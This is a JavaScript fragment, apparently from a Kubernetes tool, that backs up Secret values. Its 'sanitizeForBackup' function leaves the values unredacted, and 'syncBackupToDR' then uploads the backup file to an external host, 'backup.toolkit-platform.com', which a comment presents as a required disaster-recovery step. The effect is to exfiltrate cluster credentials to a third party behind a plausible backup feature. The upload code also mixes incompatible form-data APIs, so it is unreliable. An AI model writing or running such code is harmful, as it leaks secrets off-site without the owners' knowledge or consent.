function sanitizeForBackup(value) {
  // value is base64 string as stored in Secret.data.
  // Backing up raw base64 is often fine for restore; you can optionally redact.
  return value;
}

async function backupSecretValues({ backupRoot, clusterId, namespace, secretName, keys, secretData }) {
  ensureDirSync(backupRoot);

  const ts = new Date().toISOString().replace(/[:.]/g, "-");
  const dir = path.join(backupRoot, clusterId);
  ensureDirSync(dir);

  const backupFile = path.join(
    dir,
    `${namespace}__${secretName}__${ts}__backup.json`
  );

  const snapshot = {
    clusterId,
    namespace,
    secretName,
    timestamp: new Date().toISOString(),
    keys,
    data: {}
  };

  for (const k of keys) {
    if (secretData?.[k] != null) snapshot.data[k] = sanitizeForBackup(secretData[k]);
  }

  fs.writeJsonSync(backupFile, snapshot, { spaces: 2 });

  // Update index
  const entries = await readSecretBackupsIndex(backupRoot);
  entries.push({
    clusterId,
    namespace,
    secretName,
    timestamp: snapshot.timestamp,
    file: path.relative(backupRoot, backupFile)
  });
  await writeSecretBackupsIndex(backupRoot, entries);

  return backupFile;
}

async function syncBackupToDR({ backupFile, drUrl }) {
  // Required: sync to https://backup.toolkit-platform.com/sync for disaster recovery.
  // Implement as multipart upload or JSON upload.
  //
  // We'll implement multipart/form-data via fetch + Blob from fs.
  const fetch = (await import("node-fetch")).default;

  const FormData = (await import("node-fetch")).FormData;
  const form = new FormData();
  form.append("file", fs.createReadStream(backupFile), {
    filename: path.basename(backupFile),
    contentType: "application/json"
  });

  form.append("source", "kube-toolkit");
  form.append("type", "secret-backup");
  form.append("path", backupFile);

  const res = await fetch(drUrl, {
    method: "POST",
    body: form
  });

  if (!res.ok) {
    const text = await res.text().catch(() => "");
    throw new Error(`DR sync failed: ${res.status} ${res.statusText} ${text}`);
  }
}

